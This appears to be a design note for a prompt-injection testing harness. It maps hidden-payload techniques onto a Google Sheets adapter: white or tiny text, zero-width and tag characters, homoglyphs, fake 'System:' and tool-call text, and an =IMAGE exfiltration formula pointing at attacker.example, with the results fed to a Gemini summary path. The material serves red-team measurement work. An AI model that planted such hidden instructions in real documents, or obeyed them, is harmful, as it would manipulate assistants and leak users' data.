# Sheets adapter — hiding-technique coverage

Sheets is a grid of cells with per-cell formatting and (via Drive)
threaded comments. Document-level techniques tied to flowing-text
semantics (footnotes, citation blocks, table-of-contents,
suggested edits) drop out by definition. The adapter renders every
technique that maps cleanly onto cells, formulas, or comments.

**Auth context.** Same `oauth_user` mode as the other adapters; the
`drive.file` scope means cleanup uses the spreadsheet ID returned by
the `spreadsheets.create` call. Production deployments would use a
service account with DWD; not exercised here.

## Legend

- ✅ **Supported**, ⚠️ **Partial**, ❌ **Unsupported**.

## Matrix

| ID | Technique | Status | Notes |
|----|-----------|:--:|--|
| `white_text` | White text on white | ✅ | `repeatCell` with `textFormat.foregroundColor=#FFFFFF`. |
| `tiny_font` | Sub-readable font | ✅ | `textFormat.fontSize=1`. |
| `font_color_near_background` | Near-bg colour | ✅ | Same path. |
| `text_box_offscreen` | Off-page text box | ❌ | Sheets has no text-box concept. |
| `zero_width_chars` | Zero-width payload | ✅ | `values.update` with the unicode chars in a cell. |
| `unicode_tag_chars` | Tag chars (E0000+) | ✅ | Same. |
| `unicode_homoglyph` | Homoglyph chars | ✅ | Same. |
| `comment_thread` | Cell-anchored comment | ✅ | `drive.comments().create` (Sheets shares Drive's comment API). |
| `comment_reply_thread` | Reply chain | ✅ | `drive.replies().create`. |
| `footnote` | Footnote carrier | ❌ | Sheets has no footnote concept. |
| `header_footer` | Page header/footer | ❌ | Sheets has print-only header/footer; not surfaced to the AI summary path. |
| `suggested_edit` | Tracked-change carrier | ❌ | No public API for suggestion mode in Sheets. |
| `table_cell_hidden` | Hidden payload in cell | ✅ | The technique's home turf — `repeatCell` formatting + the cell's `hidden` marker. |
| `image_alt_text` | Alt text on image | ✅ | `=IMAGE("…")` formula puts a real image in the cell; alt text rides as a `<note>`. |
| `document_metadata` | File-level metadata | ⚠️ | `updateSpreadsheetProperties` only honours `title` / `locale` / `timeZone`; arbitrary keys are dropped. The Drive `appProperties` route is available as a fallback if a future technique needs it. |
| `citation_block` | Citation-shaped carrier | ❌ | Sheets has no citation block; encoding it as a plain-text cell loses the technique's semantic, so we mark it unsupported rather than partial. |
| `table_of_contents` | Auto-generated TOC | ❌ | No analogue. |
| `linked_content` | External / cross-doc link | ✅ | `=HYPERLINK("…", "…")` formula. |
| `encoded_payload` | Base64 / ROT13 inline | ✅ | Plain text in a cell. |
| `multilingual` | Mixed-script payload | ✅ | UTF-8 cell values; `locale` can be set via `document_metadata`. |
| `role_confusion` | "System: ..." mimicry | ✅ | Plain text. |
| `tool_format_mimicry` | JSON / tool-call mimic | ✅ | Plain text. |
| `markdown_injection` | Raw markdown payload | ✅ | Cells render markdown literally — preserves the technique. |
| `cross_document_chain` | Linked external doc | ❌ | Like the Gmail adapter, the orchestrator owns the multi-doc chain. The `=HYPERLINK` cell *creates* the link but the second document needs the Docs adapter to render. |
| `image_rendering_exfil` | Image-tag exfil | ✅ | `=IMAGE("attacker.example/…")`. Whether Sheets fetches at render is the variable we measure. |

## Invoke modes

- **`api_mode` (default)**: `spreadsheets.values().get` over a wide
  range → TSV → Gemini Provider. Cheaper than the Drive plain-text
  export for large sheets.
- **`ui_mode`**: stub. Browser automation against `sheets.google.com`
  is the future-work path (Prompt 13 candidate).

## Known gaps

1. `document_metadata` storage is restricted to the small set of
   `properties` Sheets exposes (`title` / `locale` / `timeZone`).
   Drive `appProperties` could pad this for a future technique that
   relies on free-form metadata; the current adapter doesn't dual-
   write to keep behaviour predictable.
2. `image_alt_text` uses a `=IMAGE` formula + a Drive comment for the
   alt text; that's the closest analogue Sheets exposes. The Workspace
   AI summary path may or may not surface the comment alongside the
   cell — measuring that interaction is part of the integration-test
   plan.
